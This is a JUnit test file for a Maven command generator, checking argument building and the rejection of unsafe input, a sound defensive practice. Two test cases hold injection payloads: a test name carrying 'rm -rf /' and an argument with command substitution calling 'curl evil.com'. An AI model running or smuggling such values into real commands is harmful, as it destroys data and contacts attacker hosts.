package com.aichangeguard.integration.docker.service;

import com.aichangeguard.common.error.ValidationException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class MavenCommandGeneratorTest {

    private MavenCommandGenerator generator;

    @BeforeEach
    void setUp() {
        generator = new MavenCommandGenerator();
    }

    @Test
    @DisplayName("Should generate standard discrete Maven test arguments")
    void shouldGenerateStandardMavenArguments() {
        List<String> tests = List.of("UserServiceTest#testFind", "OrderServiceTest");
        List<String> command = generator.generateCommand(tests, true, List.of("-pl", "backend"));

        assertThat(command).contains("mvn", "-B", "--no-transfer-progress", "-o", "test");
        assertThat(command).contains("-Dsurefire.failIfNoSpecifiedTests=false");
        assertThat(command).contains("-Dtest=UserServiceTest#testFind,OrderServiceTest");
        assertThat(command).contains("-pl", "backend");
    }

    @Test
    @DisplayName("Should omit -o flag when network is enabled")
    void shouldOmitOfflineFlagWhenNetworkEnabled() {
        List<String> command = generator.generateCommand(List.of("SimpleTest"), false, null);

        assertThat(command).contains("mvn", "test");
        assertThat(command).doesNotContain("-o");
    }

    @Test
    @DisplayName("Should reject test names containing command injection characters")
    void shouldRejectCommandInjectionInTestNames() {
        List<String> maliciousTests = List.of("UserServiceTest; rm -rf /");

        assertThatThrownBy(() -> generator.generateCommand(maliciousTests, true, null))
                .isInstanceOf(ValidationException.class)
                .hasMessageContaining("Invalid or unsafe test identifier");
    }

    @Test
    @DisplayName("Should reject command substitution in additional arguments")
    void shouldRejectCommandSubstitutionInExtraArgs() {
        List<String> badArgs = List.of("-Dparam=$(curl evil.com)");

        assertThatThrownBy(() -> generator.generateCommand(List.of("SafeTest"), true, badArgs))
                .isInstanceOf(ValidationException.class)
                .hasMessageContaining("Unsafe characters detected");
    }
}

